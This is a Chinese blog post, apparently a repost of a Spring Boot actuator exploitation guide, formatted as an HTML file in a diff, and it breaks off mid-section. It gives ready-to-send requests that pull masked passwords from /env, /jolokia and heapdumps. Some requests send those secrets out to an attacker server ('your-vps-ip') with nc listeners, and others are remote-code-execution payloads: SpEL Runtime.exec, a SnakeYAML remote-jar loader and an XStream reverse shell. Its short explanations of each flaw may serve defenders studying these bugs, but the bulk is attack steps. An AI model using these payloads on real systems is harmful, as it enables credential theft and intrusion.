@@ -1,0 +1,1199 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>资料Spring_Boot相关 | Gridea</title>
+<link rel="shortcut icon" href="https://piaogexu.github.io/favicon.ico?v=1606548080714">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://piaogexu.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="资料Spring_Boot相关 | Gridea - Atom Feed" href="https://piaogexu.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Spring_Boot
+转载：https://my.oschina.net/u/4615518/blog/4505210
+
+作者github地址：https://github.com/LandGrey/SpringBootVulExploi..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://piaogexu.github.io">
+  <img class="avatar" src="https://piaogexu.github.io/images/avatar.png?v=1606548080714" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              资料Spring_Boot相关
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-11-28
+              </span>
+              <span>
+                26 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h3 id="spring_boot">Spring_Boot</h3>
+<pre><code>转载：https://my.oschina.net/u/4615518/blog/4505210
+
+作者github地址：https://github.com/LandGrey/SpringBootVulExploit
+</code></pre>
+<h4 id="0x01路由知识">0x01：路由知识</h4>
+<ul>
+<li>
+<p><code>Spring Boot 1.x</code> 版本默认内置路由的根路径以<code>/</code>开始，<code>2.x</code>则统一以<code>/actuator</code>开始</p>
+</li>
+<li>
+<p>有些程序员会自定义<code>/manage</code>、<code>/management</code>或<strong>项目相关名称</strong>为根路径</p>
+</li>
+<li>
+<p>默认内置路由名字，如<code>/env</code>有时候也会被程序员修改，如修改成<code>/appenv</code></p>
+</li>
+</ul>
+<h4 id="0x02版本知识">0x02：版本知识</h4>
+<p><code>Spring Cloud</code>是基于<code>Spring Boot</code> 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。</p>
+<h5 id="常见组件的版本相互依赖关系">常见组件的版本相互依赖关系：</h5>
+<table>
+<thead>
+<tr>
+<th>依赖项</th>
+<th>版本列表及依赖组件版本</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>spring-boot-starter-parent</td>
+<td>spring-boot-starter-parent</td>
+</tr>
+<tr>
+<td>spring-boot-dependencies</td>
+<td>spring-boot-dependencies</td>
+</tr>
+<tr>
+<td>spring-cloud-dependencies</td>
+<td>spring-cloud-dependencies</td>
+</tr>
+</tbody>
+</table>
+<h5 id="spring-cloud-与-spring-boot-大版本之间的依赖关系">Spring Cloud 与 Spring Boot 大版本之间的依赖关系：</h5>
+<table>
+<thead>
+<tr>
+<th>Spring Cloud</th>
+<th>Spring Boot</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Angel</td>
+<td>兼容 Spring Boot 1.2.x</td>
+</tr>
+<tr>
+<td>Brixton</td>
+<td>兼容 Spring Boot 1.3.x、1.4.x</td>
+</tr>
+<tr>
+<td>Camden</td>
+<td>兼容 Spring Boot 1.4.x、1.5.x</td>
+</tr>
+<tr>
+<td>Dalston</td>
+<td>兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
+</tr>
+<tr>
+<td>Edgware</td>
+<td>兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
+</tr>
+<tr>
+<td>Finchley</td>
+<td>兼容 Spring Boot 2.0.x，不兼容 1.5.x</td>
+</tr>
+<tr>
+<td>Greenwich</td>
+<td>兼容 Spring Boot 2.1.x</td>
+</tr>
+<tr>
+<td>Hoxton</td>
+<td>兼容 Spring Boot 2.2.x</td>
+</tr>
+</tbody>
+</table>
+<h5 id="spring-cloud-小版本号的后缀及含义">Spring Cloud 小版本号的后缀及含义:</h5>
+<table>
+<thead>
+<tr>
+<th>版本号后缀</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>BUILD-SNAPSHOT</td>
+<td>快照版，代码不是固定，处于变化之中</td>
+</tr>
+<tr>
+<td>MX</td>
+<td>里程碑版</td>
+</tr>
+<tr>
+<td>RCX</td>
+<td>候选发布版</td>
+</tr>
+<tr>
+<td>RELEASE</td>
+<td>正式发布版</td>
+</tr>
+<tr>
+<td>SRX</td>
+<td>(修复错误和 bug 并再次发布的)正式发布版</td>
+</tr>
+</tbody>
+</table>
+<h3 id="一信息泄露">一：信息泄露</h3>
+<h4 id="0x01路由地址及接口调用详情泄漏">0x01：路由地址及接口调用详情泄漏</h4>
+<p>开发环境切换为线上生产环境时，相关人员没有更改配置文件或忘记切换配置环境，导致此漏洞</p>
+<p>直接访问以下几个路由，验证漏洞是否存在：</p>
+<pre><code>/api-docs
+/v2/api-docs
+/swagger-ui.html
+</code></pre>
+<p>一些可能会遇到的接口路由变形：</p>
+<pre><code>/api.html
+/sw/swagger-ui.html
+/api/swagger-ui.html
+/template/swagger-ui.html
+/spring-security-rest/api/swagger-ui.html
+/spring-security-oauth-resource/swagger-ui.html
+</code></pre>
+<p>除此之外，下面的路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：</p>
+<pre><code>/mappings
+/actuator/mappings
+/metrics
+/actuator/metrics
+/beans
+/actuator/beans
+/configprops
+/actuator/configprops
+</code></pre>
+<p><strong>一般来讲，知道 spring boot 应用的相关接口和传参信息并不能算是漏洞；</strong></p>
+<p>但是可以检查暴露的接口是否存在未授权访问、越权或者其他业务型漏洞。</p>
+<h4 id="0x02配置不当而暴露的路由">0x02：配置不当而暴露的路由</h4>
+<p>主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置</p>
+<p>参考 <code>production-ready-endpoints</code> 和 <code>spring-boot.txt</code>，可能因为配置不当而暴露的默认内置路由可能会有：</p>
+<pre><code>/actuator
+/auditevents
+/autoconfig
+/beans
+/caches
+/conditions
+/configprops
+/docs
+/dump
+/env
+/flyway
+/health
+/heapdump
+/httptrace
+/info
+/intergrationgraph
+/jolokia
+/logfile
+/loggers
+/liquibase
+/metrics
+/mappings
+/prometheus
+/refresh
+/scheduledtasks
+/sessions
+/shutdown
+/trace
+/threaddump
+/actuator/auditevents
+/actuator/beans
+/actuator/health
+/actuator/conditions
+/actuator/configprops
+/actuator/env
+/actuator/info
+/actuator/loggers
+/actuator/heapdump
+/actuator/threaddump
+/actuator/metrics
+/actuator/scheduledtasks
+/actuator/httptrace
+/actuator/mappings
+/actuator/jolokia
+/actuator/hystrix.stream
+</code></pre>
+<p>其中对寻找漏洞比较重要接口的有：</p>
+<pre><code>/env、/actuator/env
+</code></pre>
+<p><code>GET</code> 请求 <code>/env</code> 会泄露环境变量信息，或者配置中的一些用户名，当程序员的属性名命名不规范 (例如 <code>password</code> 写成<code>psasword</code>、<code>pwd</code>) 时，会泄露密码明文；</p>
+<p>同时有一定概率可以通过 <code>POST</code> 请求 <code>/env</code> 接口设置一些属性，触发相关 <code>RCE</code> 漏洞。</p>
+<pre><code>/jolokia
+</code></pre>
+<p>通过<code>/jolokia/list</code>接口寻找可以利用的<code>MBean</code>，触发相关<code>RCE</code>漏洞。</p>
+<pre><code>/trace
+</code></pre>
+<p>一些 <code>http</code> 请求包访问跟踪信息，有可能发现有效的 <code>cookie</code> 信息。</p>
+<h4 id="0x03获取被星号脱敏的密码的明文-方法一">0x03：获取被星号脱敏的密码的明文 (方法一)</h4>
+<p>访问<code>/env</code>接口时，<code>spring actuator</code>会将一些带有敏感关键词(如 <code>password</code>、<code>secret</code>)的属性名对应的属性值用 <code>*</code> 号替换达到脱敏的效果。</p>
+<h5 id="利用条件">利用条件：</h5>
+<ul>
+<li>
+<p>目标网站存在<code>/jolokia</code>或<code>/actuator/jolokia</code>接口。</p>
+</li>
+<li>
+<p>目标使用了<code>jolokia-core</code>依赖（版本要求暂未知）。</p>
+</li>
+</ul>
+<h5 id="利用方法">利用方法：</h5>
+<h6 id="步骤一找到想要获取的属性名">步骤一：找到想要获取的属性名</h6>
+<p><code>GET</code> 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 <code>*</code> 遮掩的属性值对应的属性名。</p>
+<h6 id="步骤二jolokia-调用相关-mbean-获取明文">步骤二：jolokia 调用相关 Mbean 获取明文</h6>
+<p>将下面示例中的 <code>security.user.password</code> 替换为实际要获取的属性名，直接发包；明文值结果包含在 <code>response</code> 数据包中的 <code>value</code> 键中。</p>
+<ul>
+<li>调用 <code>org.springframework.boot Mbean</code>（可能更通用）</li>
+</ul>
+<p><strong>实际上是调用 <code>org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar</code> 类实例的 <code>getProperty</code> 方法</strong></p>
+<p>spring 1.x</p>
+<pre><code>POST /jolokia
+Content-Type: application/json
+
+{&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/jolokia
+Content-Type: application/json
+
+{&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+</code></pre>
+<ul>
+<li>调用 <code>org.springframework.cloud.context.environment Mbean</code>（需要 <code>spring cloud</code>相关依赖）</li>
+</ul>
+<p><strong>实际上是调用 <code>org.springframework.cloud.context.environment.EnvironmentManager</code> 类实例的 <code>getProperty</code> 方法</strong></p>
+<p>spring 1.x</p>
+<pre><code>POST /jolokia
+Content-Type: application/json
+
+{&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/jolokia
+Content-Type: application/json
+
+{&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+</code></pre>
+<h4 id="0x04获取被星号脱敏的密码的明文-方法二">0x04：获取被星号脱敏的密码的明文 (方法二)</h4>
+<p>访问 <code>/env</code>接口时，<code>spring actuator</code> 会将一些带有敏感关键词(如 <code>password</code>、<code>secret</code>)的属性名对应的属性值用 <code>*</code> 号替换达到脱敏的效果</p>
+<h5 id="利用条件-2">利用条件：</h5>
+<ul>
+<li>
+<p>可以 <code>GET</code> 请求目标网站的 <code>/env</code></p>
+</li>
+<li>
+<p>可以 <code>POST</code> 请求目标网站的 <code>/env</code></p>
+</li>
+<li>
+<p>可以 <code>POST</code> 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</p>
+</li>
+<li>
+<p>目标使用了 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖</p>
+</li>
+<li>
+<p>目标可以请求攻击者的服务器（请求可出外网）</p>
+</li>
+</ul>
+<h5 id="利用方法-2">利用方法：</h5>
+<h6 id="步骤一找到想要获取的属性名-2">步骤一：找到想要获取的属性名</h6>
+<p><code>GET</code> 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 <code>*</code> 遮掩的属性值对应的属性名。</p>
+<h6 id="步骤二使用-nc-监听-http-请求">步骤二：使用 nc 监听 HTTP 请求</h6>
+<p>在自己控制的外网服务器上监听 80 端口：</p>
+<pre><code>nc -lvk 80
+</code></pre>
+<h6 id="步骤三设置-eurekaclientserviceurldefaultzone-属性">步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</h6>
+<p>将下面 <code>http://value:${security.user.password}@your-vps-ip</code> 中的 <code>security.user.password</code> 换成自己想要获取的对应的星号 <code>*</code> 遮掩的属性名；</p>
+<p><code>your-vps-ip</code> 换成自己外网服务器的真实 <code>ip</code> 地址。</p>
+<p>spring 1.x</p>
+<pre><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://value:${security.user.password}@your-vps-ip&quot;}
+</code></pre>
+<h6 id="步骤四刷新配置">步骤四：刷新配置</h6>
+<p>spring 1.x</p>
+<pre><code>POST /refresh
+Content-Type: application/x-www-form-urlencoded
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/refresh
+Content-Type: application/json
+</code></pre>
+<h6 id="步骤五解码属性值">步骤五：解码属性值</h6>
+<p>正常的话，此时 <code>nc</code> 监听的服务器会收到目标发来的请求，其中包含类似如下 <code>Authorization</code> 头内容：</p>
+<pre><code>Authorization: Basic dmFsdWU6MTIzNDU2
+</code></pre>
+<p>将其中的 <code>dmFsdWU6MTIzNDU2</code>部分使用 <code>base64</code> 解码，即可获得类似明文值 <code>value:123456</code>，其中的 <code>123456</code> 即是目标星号 <code>*</code> 脱敏前的属性值明文。</p>
+<h4 id="0x05获取被星号脱敏的密码的明文-方法三">0x05：获取被星号脱敏的密码的明文 (方法三)</h4>
+<p>访问 <code>/env</code> 接口时，<code>spring actuator</code> 会将一些带有敏感关键词(如 <code>password</code>、<code>secret</code>)的属性名对应的属性值用 <code>*</code> 号替换达到脱敏的效果</p>
+<h5 id="利用条件-3">利用条件：</h5>
+<ul>
+<li>
+<p>通过 <code>POST</code> <code>/env</code> 设置属性触发目标对外网指定地址发起任意 <code>http</code> 请求</p>
+</li>
+<li>
+<p>目标可以请求攻击者的服务器（请求可出外网）</p>
+</li>
+</ul>
+<h5 id="利用方法-3">利用方法：</h5>
+<p>参考 <code>UUUUnotfound</code> 提出的 <code>issue-1</code>，可以在目标发外部 <code>http</code> 请求的过程中，在 <code>url path</code> 中利用占位符带出数据</p>
+<h6 id="步骤一找到想要获取的属性名-3">步骤一：找到想要获取的属性名</h6>
+<p><code>GET</code> 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 <code>*</code> 遮掩的属性值对应的属性名。</p>
+<h6 id="步骤二使用-nc-监听-http-请求-2">步骤二：使用 nc 监听 HTTP 请求</h6>
+<p>在自己控制的外网服务器上监听 80 端口：</p>
+<pre><code>nc -lvk 80
+</code></pre>
+<h6 id="步骤三触发对外-http-请求">步骤三：触发对外 http 请求</h6>
+<ul>
+<li><code>spring.cloud.bootstrap.location</code> 方法（同时适用于明文数据中有特殊 <code>url</code> 字符的情况）：</li>
+</ul>
+<p>spring 1.x</p>
+<pre><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/?=${security.user.password}&quot;}
+</code></pre>
+<ul>
+<li><code>eureka.client.serviceUrl.defaultZone</code> 方法（不适用于明文数据中有特殊 <code>url</code> 字符的情况）：</li>
+</ul>
+<p>spring 1.x</p>
+<pre><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/${security.user.password}&quot;}
+</code></pre>
+<h6 id="步骤四刷新配置-2">步骤四：刷新配置</h6>
+<p>spring 1.x</p>
+<pre><code>POST /refresh
+Content-Type: application/x-www-form-urlencoded
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/refresh
+Content-Type: application/json
+</code></pre>
+<h4 id="0x06获取被星号脱敏的密码的明文-方法四">0x06：获取被星号脱敏的密码的明文 (方法四)</h4>
+<p>访问 <code>/env</code> 接口时，<code>spring actuator</code> 会将一些带有敏感关键词(如 <code>password</code>、<code>secret</code>)的属性名对应的属性值用 <code>*</code> 号替换达到脱敏的效果</p>
+<h5 id="利用条件-4">利用条件：</h5>
+<h6 id="步骤一找到想要获取的属性名-4">步骤一：找到想要获取的属性名</h6>
+<p><code>GET</code> 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 <code>*</code> 遮掩的属性值对应的属性名。</p>
+<h6 id="步骤二下载-jvm-heap-信息">步骤二：下载 jvm heap 信息</h6>
+<p>下载的 <code>heapdump</code> 文件大小通常在 <code>50M—500M</code> 之间，有时候也可能会大于 <code>2G</code></p>
+<p><code>GET</code> 请求目标的 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口，下载应用实时的 <code>JVM</code> 堆信息</p>
+<h6 id="步骤三使用-mat-获得-jvm-heap-中的密码明文">步骤三：使用 MAT 获得 jvm heap 中的密码明文</h6>
+<p>参考 文章 方法，使用 <code>Eclipse Memory Analyzer</code> 工具的 <code>OQL</code> 语句 <code>select * from org.springframework.web.context.support.StandardServletEnvironment</code>， 辅助快速过滤分析，获得密码明文</p>
+<h3 id="二远程代码执行">二：远程代码执行</h3>
+<p>由于 <code>spring boot</code> 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准。</p>
+<h4 id="0x01whitelabel-error-page-spel-rce">0x01：whitelabel error page SpEL RCE</h4>
+<h5 id="利用条件-5">利用条件：</h5>
+<ul>
+<li>
+<p><code>spring boot 1.1.0-1.1.12</code>、<code>1.2.0-1.2.7</code>、<code>1.3.0</code></p>
+</li>
+<li>
+<p>至少知道一个触发 <code>springboot</code> 默认错误页面的接口及参数名</p>
+</li>
+</ul>
+<h5 id="利用方法-4">利用方法：</h5>
+<h6 id="步骤一找到一个正常传参处">步骤一：找到一个正常传参处</h6>
+<p>比如发现访问 <code>/article?id=xxx</code> ，页面会报状态码为<code>500</code>的错误：<code>Whitelabel Error Page</code>，则后续 <code>payload</code> 都将会在参数 <code>id</code> 处尝试。</p>
+<h6 id="步骤二执行-spel-表达式">步骤二：执行 SpEL 表达式</h6>
+<p>输入 <code>/article?id=${7*7}</code> ，如果发现报错页面将 <code>7*7</code> 的值 <code>49</code> 计算出来显示在报错页面上，那么基本可以确定目标存在 <code>SpEL</code> 表达式注入漏洞。</p>
+<p>由字符串格式转换成 <code>0x**</code> <code>java</code> 字节形式，方便执行任意代码：</p>
+<pre><code># coding: utf-8
+
+result = &quot;&quot;
+target = 'open -a Calculator'
+for x in target:
+    result += hex(ord(x)) + &quot;,&quot;
+print(result.rstrip(','))
+</code></pre>
+<p>执行 <code>open -a Calculator</code> 命令</p>
+<pre><code>${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}
+</code></pre>
+<h5 id="漏洞原理">漏洞原理：</h5>
+<ol>
+<li>
+<p><code>spring boot</code> 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</p>
+</li>
+<li>
+<p>此时 <code>URL</code> 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</p>
+</li>
+<li>
+<p>其中 <code>${}</code> 包围的内容都会被 <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code>resolvePlaceholder</code> 方法当作 <code>SpEL</code> 表达式被解析执行，造成 <code>RCE</code> 漏洞</p>
+</li>
+</ol>
+<h5 id="漏洞分析">漏洞分析：</h5>
+<p><code>SpringBoot SpEL</code>表达式注入漏洞-分析与复现</p>
+<h5 id="漏洞环境">漏洞环境：</h5>
+<p><code>repository/springboot-spel-rce</code></p>
+<p>正常访问</p>
+<pre><code>http://127.0.0.1:9091/article?id=66
+</code></pre>
+<p>执行<code>open -a Calculator</code>命令：</p>
+<pre><code>http://127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}
+</code></pre>
+<h4 id="0x02spring-cloud-snakeyaml-rce">0x02：spring cloud SnakeYAML RCE</h4>
+<h5 id="利用条件-6">利用条件：</h5>
+<ul>
+<li>
+<p>可以 <code>POST</code> 请求目标网站的 <code>/env</code> 接口设置属性</p>
+</li>
+<li>
+<p>可以 <code>POST</code> 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuato</code> 依赖）</p>
+</li>
+<li>
+<p>目标依赖的 <code>spring-cloud-starter</code> 版本 <code>&lt; 1.3.0.RELEASE</code></p>
+</li>
+<li>
+<p>目标可以请求攻击者的 <code>HTTP</code> 服务器（请求可出外网）</p>
+</li>
+</ul>
+<h5 id="利用方法-5">利用方法：</h5>
+<h6 id="步骤一托管-yml-和-jar-文件">步骤一：托管 yml 和 jar 文件</h6>
+<p>在自己控制的 <code>vps</code> 机器上开启一个简单<code>HTTP</code> 服务器，端口尽量使用常见 <code>HTTP</code> 服务端口（<code>80</code>、<code>443</code>）</p>
+<pre><code># 使用 python 快速开启 http server
+
+python2 -m SimpleHTTPServer 80
+python3 -m http.server 80
+</code></pre>
+<p>在网站根目录下放置后缀为 <code>yml</code> 的文件 <code>example.yml</code>，内容如下：</p>
+<pre><code>!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL [&quot;http://your-vps-ip/example.jar&quot;]
+  ]]
+]
+</code></pre>
+<p>在网站根目录下放置后缀为 <code>jar</code> 的文件 <code>example.jar</code>，内容是要执行的代码，代码编写及编译方式参考 <code>yaml-payload</code>。</p>
+<h6 id="步骤二设置-springcloudbootstraplocation-属性">步骤二：设置 spring.cloud.bootstrap.location 属性</h6>
+<p>spring 1.x</p>
+<pre><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.cloud.bootstrap.location=http://your-vps-ip/example.yml
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.yml&quot;}
+</code></pre>
+<h6 id="步骤三刷新配置">步骤三：刷新配置</h6>
+<p>spring 1.x</p>
+<pre><code>POST /refresh
+Content-Type: application/x-www-form-urlencoded
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/refresh
+Content-Type: application/json
+</code></pre>
+<h5 id="漏洞原理-2">漏洞原理：</h5>
+<ol>
+<li>
+<p><code>spring.cloud.bootstrap.location</code> 属性被设置为外部恶意 <code>yml</code> 文件<code>URL</code> 地址</p>
+</li>
+<li>
+<p><code>refresh</code> 触发目标机器请求远程 HTTP 服务器上的 <code>yml</code> 文件，获得其内容</p>
+</li>
+<li>
+<p><code>SnakeYAML</code> 由于存在反序列化漏洞，所以解析恶意 <code>yml</code> 内容时会完成指定的动作</p>
+</li>
+<li>
+<p>先是触发 <code>java.net.URL</code> 去拉取远程 <code>HTTP</code> 服务器上的恶意 <code>jar</code> 文件</p>
+</li>
+<li>
+<p>然后是寻找 <code>jar</code> 文件中实现 <code>javax.script.ScriptEngineFactory</code> 接口的类并实例化</p>
+</li>
+<li>
+<p>实例化类时执行恶意代码，造成 <code>RCE</code> 漏洞</p>
+</li>
+</ol>
+<h5 id="漏洞分析-2">漏洞分析：</h5>
+<p><code>Exploit Spring Boot Actuator 之 Spring Cloud Env</code> 学习笔记</p>
+<h5 id="漏洞环境-2">漏洞环境：</h5>
+<pre><code>repository/springcloud-snakeyaml-rce
+</code></pre>
+<p>正常访问：</p>
+<pre><code>http://127.0.0.1:9092/env
+</code></pre>
+<h4 id="0x03eureka-xstream-deserialization-rce">0x03：eureka xstream deserialization RCE</h4>
+<h5 id="利用条件-7">利用条件：</h5>
+<ul>
+<li>
+<p>可以 <code>POST</code> 请求目标网站的 <code>/env</code> 接口设置属性</p>
+</li>
+<li>
+<p>可以 <code>POST</code> 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</p>
+</li>
+<li>
+<p>目标使用的 <code>eureka-client &lt; 1.8.7</code>（通常包含在 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖中）</p>
+</li>
+<li>
+<p>目标可以请求攻击者的 <code>HTTP</code> 服务器（请求可出外网）</p>
+</li>
+</ul>
+<h5 id="利用方法-6">利用方法：</h5>
+<h6 id="步骤一架设响应恶意-xstream-payload-的网站">步骤一：架设响应恶意 XStream payload 的网站</h6>
+<p>提供一个依赖 <code>Flask</code> 并符合要求的 <code>python</code> 脚本示例，作用是利用目标 <code>Linux</code> 机器上自带的 <code>python</code> 来反弹<code>shell</code>。</p>
+<p>使用<code>python</code> 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 <code>shell</code> 的 <code>ip</code> 地址和 端口号。</p>
+<h6 id="步骤二监听反弹-shell-的端口">步骤二：监听反弹 shell 的端口</h6>
+<p>一般使用 <code>nc</code> 监听端口，等待反弹 <code>shell</code></p>
+<pre><code>nc -lvp 443
+</code></pre>
+<h6 id="步骤三设置-eurekaclientserviceurldefaultzone-属性-2">步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</h6>
+<p>spring 1.x</p>
+<pre><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example&quot;}
+</code></pre>
+<h6 id="步骤四刷新配置-3">步骤四：刷新配置</h6>
+<p>spring 1.x</p>
+<pre><code>POST /refresh
+Content-Type: application/x-www-form-urlencoded
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/refresh
+Content-Type: application/json
+</code></pre>
+<h5 id="漏洞原理-3">漏洞原理：</h5>
+<ol>
+<li>
+<p><code>eureka.client.serviceUrl.defaultZone</code> 属性被设置为恶意的外部 <code>eureka server URL</code> 地址</p>
+</li>
+<li>
+<p><code>refresh</code> 触发目标机器请求远程 <code>URL</code>，提前架设的 <code>fake eureka server</code> 就会返回恶意的 <code>payload</code></p>
+</li>
+<li>
+<p>目标机器相关依赖解析 <code>payload</code>，触发 <code>XStream</code> 反序列化，造成 <code>RCE</code> 漏洞</p>
+</li>
+</ol>
+<h5 id="漏洞分析-3">漏洞分析：</h5>
+<p><code>Spring Boot Actuator</code>从未授权访问到<code>getshell</code></p>
+<h5 id="漏洞环境-3">漏洞环境：</h5>
+<pre><code>repository/springboot-eureka-xstream-rce
+</code></pre>
+<p>正常访问：</p>
+<pre><code>http://127.0.0.1:9093/env
+</code></pre>
+<h4 id="0x04jolokia-logback-jndi-rce">0x04：jolokia logback JNDI RCE</h4>
+<h5 id="利用条件-8">利用条件：</h5>
+<ul>
+<li>
+<p>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</p>
+</li>
+<li>
+<p>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关<code>MBean</code></p>
+</li>
+<li>
+<p>目标可以请求攻击者的 <code>HTTP</code> 服务器（请求可出外网）</p>
+</li>
+<li>
+<p><code>JNDI</code> 注入受目标 <code>JDK</code> 版本影响，<code>jdk &lt; 6u201/7u191/8u182/11.0.1</code>（<code>LDAP</code> 方式）</p>
+</li>
+</ul>
+<h5 id="利用方法-7">利用方法：</h5>
+<h6 id="步骤一查看已存在的-mbeans">步骤一：查看已存在的 MBeans</h6>
+<p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code>reloadByURL</code> 关键词。</p>
+<h6 id="步骤二托管-xml-文件">步骤二：托管 xml 文件</h6>
